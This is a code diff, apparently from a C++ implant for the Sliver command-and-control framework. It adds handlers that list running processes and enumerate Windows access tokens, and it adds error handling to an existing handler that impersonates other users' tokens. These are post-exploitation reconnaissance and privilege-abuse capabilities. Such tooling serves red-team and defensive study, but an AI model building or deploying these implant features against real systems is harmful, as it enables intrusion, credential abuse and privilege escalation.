@@ -11,6 +11,7 @@
 #include <gzip/decompress.hpp>
 #include "Token.h"
 #include "Utils.h"
+#include "processes.h"
 
 using namespace std;
 using namespace taskrunner;
@@ -32,14 +33,39 @@ namespace handlers {
 		{sliverpb::MsgRevToSelfReq,static_cast<handler>(revToSelfHandler)},
 		{sliverpb::MsgExecuteWindowsReq,static_cast<handler>(executeHandler)},
 		{sliverpb::MsgExecuteReq,static_cast<handler>(executeHandler)},
-		{sliverpb::MsgImpersonateReq,static_cast<handler>(impersonateHandler)}
-
-
+		{sliverpb::MsgImpersonateReq,static_cast<handler>(impersonateHandler)},
+		{sliverpb::MsgListTokensReq,static_cast<handler>(ListTokensHandler)},
+		{sliverpb::MsgPsReq,static_cast<handler>(psHandler)}
 	};
 	
 	map<int, handler>& getSystemHandlers() {
 		return systemHandlers;
 	}
+
+	sliverpb::Envelope psHandler(int64_t taskID, string data) {
+		sliverpb::PsReq req;
+		sliverpb::Ps resp;
+		req.ParseFromString(data);
+		try {
+			auto procs = processes::ps();
+			for (auto it = procs.begin();it != procs.end();++it) {
+				auto proc = resp.add_processes();
+				proc->set_architecture(it->arch);
+				proc->set_executable(it->exe);
+				proc->set_owner(it->owner);
+				proc->set_pid(it->pid);
+				proc->set_ppid(it->ppid);
+				proc->set_sessionid(it->sessionID);
+			}
+		}
+		catch (exception& e) {
+			auto common_resp = new sliverpb::Response();
+			common_resp->set_err(std::format("execute triggered exception: {}", e.what()));
+			resp.set_allocated_response(common_resp);
+		}
+		return wrapResponse(taskID, resp);
+	}
+
 	sliverpb::Envelope executeHandler(int64_t taskID, string data) {
 		sliverpb::ExecuteWindowsReq req;
 		sliverpb::Execute resp;
@@ -229,16 +255,52 @@ namespace handlers {
 		}
 		return wrapResponse(taskID, resp);
 	}
-
+	sliverpb::Envelope ListTokensHandler(int64_t taskID, string data) {
+		sliverpb::ListTokensReq req;
+		sliverpb::ListTokens resp;
+		req.ParseFromString(data);
+		try {
+			auto tokens = token::ListTokens();
+			for (auto it = tokens.begin();it != tokens.end();++it) {
+				auto token = resp.add_tokens();
+				token->set_tokenid(*((uint64_t*)(&(it->TokenId))));
+				token->set_logonsessionid(*((uint64_t*)(&(it->LogonSessionId))));
+				token->set_logontype(it->LogonType);
+				token->set_privilegescount(it->PrivilegesCount);
+				token->set_tokenimplevel(it->TokenImpLevel);
+				token->set_tokentype(it->TokenType);
+				token->set_tokenintegrity(it->TokenIntegrity);
+				token->set_username(utils::ws2s(it->Username));
+			}
+		}
+		catch (exception& e) {
+			auto common_resp = new sliverpb::Response();
+			common_resp->set_err(std::format("ListTokens triggered exception: {}", e.what()));
+			resp.set_allocated_response(common_resp);
+		}
+		return wrapResponse(taskID, resp);
+	}
 	sliverpb::Envelope impersonateHandler(int64_t taskID, string data) {
 		sliverpb::ImpersonateReq req;
 		req.ParseFromString(data);
 		sliverpb::Impersonate resp;
 		bool res = FALSE;
-		if (utils::is_number(req.username()))
-			res = token::Impersonate(stoi(req.username()));
-		else
-			res = token::Impersonate(req.username());
+		try {
+			if (utils::is_number(req.username()))
+				res = token::Impersonate(stoi(req.username()));
+			else
+				res = token::Impersonate(req.username());
+			if (res == false) {
+				sliverpb::Response* common_resp = new sliverpb::Response();
+				common_resp->set_err(string{ "[-] Failed to impersonate. No suitable token found" });
+				resp.set_allocated_response(common_resp);
+			}
+		}
+		catch (exception& e) {
+			sliverpb::Response* common_resp = new sliverpb::Response();
+			common_resp->set_err(string{ "[-] Impersonate thrown following exception:\n" }+e.what());
+			resp.set_allocated_response(common_resp);
+		}
 		return wrapResponse(taskID, resp);
 	}
 }
